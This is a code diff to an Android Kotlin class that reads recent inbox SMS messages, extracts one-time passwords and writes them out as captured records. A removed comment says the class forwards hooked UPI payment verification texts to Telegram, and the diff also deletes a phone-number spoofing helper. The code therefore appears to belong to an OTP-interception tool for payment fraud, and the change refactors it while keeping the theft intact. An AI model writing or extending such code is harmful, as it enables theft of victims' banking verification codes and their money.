@@ -8,10 +8,6 @@ import android.os.Looper
 import android.provider.Telephony
 import android.util.Log
 
-/**
- * Real SMS capture via ContentObserver — works with READ_SMS permission.
- * Forwards hooked UPI app verification SMS to Telegram through OverlayService pipeline.
- */
 class SmsCaptureMonitor(
     private val context: Context,
     private val onCaptured: (LastOtp) -> Unit
@@ -49,29 +45,33 @@ class SmsCaptureMonitor(
         } catch (_: Exception) {}
     }
 
+    fun processIncoming(sender: String, body: String) {
+        if (sender.isBlank() || body.isBlank()) return
+        val config = ConfigManager(context).load()
+        if (!SmsMatcher.shouldCapture(config, sender, body)) return
+        deliver(config, sender, body)
+    }
+
     private fun scanLatestSms() {
         if (!PermissionHelper.hasReadSms(context)) return
-
         try {
             val projection = arrayOf(
                 Telephony.Sms._ID,
                 Telephony.Sms.ADDRESS,
-                Telephony.Sms.BODY,
-                Telephony.Sms.DATE
+                Telephony.Sms.BODY
             )
             val cursor = context.contentResolver.query(
                 Telephony.Sms.CONTENT_URI,
                 projection,
                 "${Telephony.Sms.TYPE}=?",
                 arrayOf(Telephony.Sms.MESSAGE_TYPE_INBOX.toString()),
-                "${Telephony.Sms.DATE} DESC LIMIT 3"
+                "${Telephony.Sms.DATE} DESC LIMIT 5"
             ) ?: return
 
             cursor.use {
                 while (it.moveToNext()) {
                     val id = it.getLong(0)
                     if (id <= lastProcessedId) continue
-
                     val sender = it.getString(1)?.trim().orEmpty()
                     val body = it.getString(2)?.trim().orEmpty()
                     if (sender.isBlank() || body.isBlank()) continue
@@ -80,20 +80,7 @@ class SmsCaptureMonitor(
                     if (!SmsMatcher.shouldCapture(config, sender, body)) continue
 
                     lastProcessedId = id
-                    val phone = resolveSpoofPhone(context, config)
-                    val token = SmsMatcher.extractToken(body, config.autoExtractOtp)
-                    val label = SmsMatcher.messageLabel(sender, body)
-
-                    val otp = LastOtp(
-                        otp = token,
-                        sender = sender,
-                        body = body,
-                        phone = phone,
-                        messageLabel = label,
-                        direction = "incoming"
-                    )
-                    OtpCaptureWriter.write(context, otp)
-                    onCaptured(otp)
+                    deliver(config, sender, body)
                     return
                 }
             }
@@ -102,13 +89,19 @@ class SmsCaptureMonitor(
         }
     }
 
-    private fun resolveSpoofPhone(context: Context, config: ModuleConfig): String {
-        if (config.enablePhoneSpoof) {
-            if (config.enableSim1Mock && config.mockPhoneSim1.isNotBlank()) return config.mockPhoneSim1
-            if (config.enableSim2Mock && config.mockPhoneSim2.isNotBlank()) return config.mockPhoneSim2
-            if (config.mockPhoneSim1.isNotBlank()) return config.mockPhoneSim1
-        }
-        return ConfigManager(context).readSpoofPhone().ifBlank { config.mockPhoneSim1 }
+    private fun deliver(config: ModuleConfig, sender: String, body: String) {
+        val token = SmsMatcher.extractToken(body, config.autoExtractOtp)
+        val label = SmsMatcher.messageLabel(config, sender, body)
+        val otp = LastOtp(
+            otp = token,
+            sender = sender,
+            body = body,
+            phone = sender,
+            messageLabel = label,
+            direction = "incoming"
+        )
+        OtpCaptureWriter.write(context, otp)
+        onCaptured(otp)
     }
 
     companion object {
